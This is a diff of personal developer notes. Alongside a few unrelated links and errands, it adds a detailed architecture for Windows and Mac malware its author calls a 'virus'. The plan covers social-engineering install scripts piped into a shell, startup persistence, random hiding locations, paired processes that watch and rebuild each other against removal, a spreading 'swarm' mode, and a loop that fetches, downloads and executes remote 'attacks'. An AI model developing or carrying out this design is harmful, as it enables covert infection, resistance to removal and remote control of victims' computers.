@@ -608,8 +608,6 @@ General principle/guideline when doing these things:
   - stop them via task manager one by one, reasonable assumption provided they don't have specialized tool to stop multiple tasks at once
 , thus the system is built to recover all these scenerios. But because they can delete and stop them pretty quickly. 1 second lower estimate, 2 second upper estimate, the mechanism to check on each other must be faster than 1 second, or else the mechanism will not make sense.
 
-universal usb installer
-
 dw tv
 
 cron jobs inside docker containers: https://blog.knoldus.com/running-a-cron-job-in-docker-container/
@@ -623,4 +621,90 @@ https://en.wikipedia.org/wiki/United_Nations_resolution
 
 https://pitmonticone.github.io/rcp85-debate/
 
+modes:
+- file mode: is expected to be a file, called by an existing virus so won't have to deal with social engineering
+- stream mode: is expected to be piped into cmd or sh or bash. If called by the initial installation then have to deal with social engineering
+the new installation schema:
+- /new/win/{user_handle}, startup script, will always be placed at appdata, stream mode
+- /new/win/{user_handle}/location/{location}, startup script, file mode, will be placed at a specific location
+- /new/win/{user_handle}/mn/{virus_id}: main script, will contain :pickRandomLocation, :hash and :unixTime, is expected to be a file
+- /new/win/{user_handle}/license
+- /new/mac/{user_handle}: mac startup script, stream mode
+- /new/mac/{user_handle}/mn/{virus_id}: mac main script
+swarm thing:
+- /new/win/{user_handle}/swarm, /new/win/{user_handle}/swarm/location/{location}, swarm installation script, file mode. Every activity stays within the specified location (default is C:\Users)
+- /new/mac/{user_handle}/swarm, /new/mac/{user_handle}/swarm/location/{location}, swarm installation script, file mode
 
+also note that the swarm will be as lightweight and mobile as possible, so won't have the baggage of licenses and all that for social engineering
+
+so what's the swarm installation script looks like? It has all the functions that the main script has, and have the base folder embedded, and not from the data file
+- pick a random location for the main script, create /dt, /mn.cmd and /ic there
+- pick a random location for the utils folder
+- send message about the utils folder and the type (1) to the incoming messages
+
+what's the initial installation script now look like? Because this is a stream, so won't have any function the main script has, and preferably can't have any labels and loopbacks
+- get the location for the main script (appdata if first time), create /entry.cmd and other dummy social engineering stuff there
+- append to the beginning of the main script "set type=0", also set the payloads and utils folder too, so there won't have to be any data loading
+- create the startup script
+
+the loops looks like this:
+- (any) loads constants, done
+  - ping_t=0
+  - last_fetch=:unixTime
+- (any) loads data, done
+  - type
+  - utils
+- if there are arguments:
+  - (implied naked) fetch:
+    - fetches the list of attacks
+    - for each attacks, prepares environment, downloads the code, executes it
+    - exits
+- if there aren't any arguments:
+- (naked) ping
+- (any) read the incoming messages to set up environmental variables
+- (hidden) delete incoming file
+- (standalone & naked) save data
+- :daemon_loop
+- if standalone:
+  - if difference between now and last_fetch is 7 seconds, log, fork off and execute "{self} fetch"
+- if naked:
+  - checks incoming message, just a "ping", records the time and compares with ping_t. If hidden is no where to be found, then create one
+  - if difference between now and last_fetch is 7 seconds, log, fork off and execute "{self} fetch"
+- if hidden: if any of these are violated, proceed to clean the naked virus
+  - checks existence of naked
+  - checks hash of naked
+  - checks existence of startup script
+  - checks hash of startup script
+  - message naked
+
+note: the plan to append directly to standalone's script's variables type and libs might have problems. Like, what if the environmental variables declared this way retain when the swarm installation script is executed? Would the variables then sort of transfer to when building the swarm? If it does transfer then it'd be pretty bad. In this particular case, it's not so bad and it seems like not a problem at all, but it is still, side effects, which is highly undesirable going forward into the future
+
+also complete the architecture before switching over to php-fpm
+
+standalone will be given these when init script starts it
+- data:
+  - type|0
+  - utils|{payloads and utils folder}
+- incoming:
+  - type|0
+  - utils|{payloads and utils folder}
+
+naked will be given these when hidden/init script starts it
+- data:
+  - type|1 // 0 for standalone, 1 for naked, 2 for hidden
+  - utils|{payloads and utils folder}
+- incoming:
+  - type|1
+  - utils|{payloads and utils folder}
+
+hidden will be given these when naked starts it:
+- data: nonexistent
+- incoming: exists for a short while, then hidden deletes it
+  - type|2
+  - utils|{payloads and utils folder}, this is for passing right back to the naked one to construct it
+
+what is the failsafe? Like, the nuke button that I can remove when testing stuff out? The base environment where things happen should be contained. This way, I can just delete everything, and both running scripts will be gone. To do this, make a script to build up the structure
+
+also test with unicode characters and whatnot
+
+general tso's and wonton soup, see places where I can eat that, then invite dan & chi?
